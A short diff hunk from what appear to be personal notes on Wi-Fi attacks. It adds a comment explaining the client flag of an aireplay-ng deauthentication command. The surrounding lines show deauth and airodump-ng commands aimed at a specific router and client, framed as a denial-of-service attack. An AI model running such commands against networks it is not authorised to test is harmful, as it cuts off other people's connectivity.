@@ -77,6 +77,7 @@ NOTE !!! : Make sure you are in the monitor mode
    # But it is not effective to launch a DDos attack the whole network
 
 3. $ aireplay-ng --deauth 10000 -a 94:FE:22:DA:AC:30 -c [ STATION - MAC ] wlanmon
+   # -c for CLient that uses that specific router / network
    # To attack the specific client
    # But unfortunately in " $ airodump-ng --channel 8 --bssid 94:FE:22:DA:AC:30 wlan0mon " we were not able to find the specific user of the selected STATION MAC
 
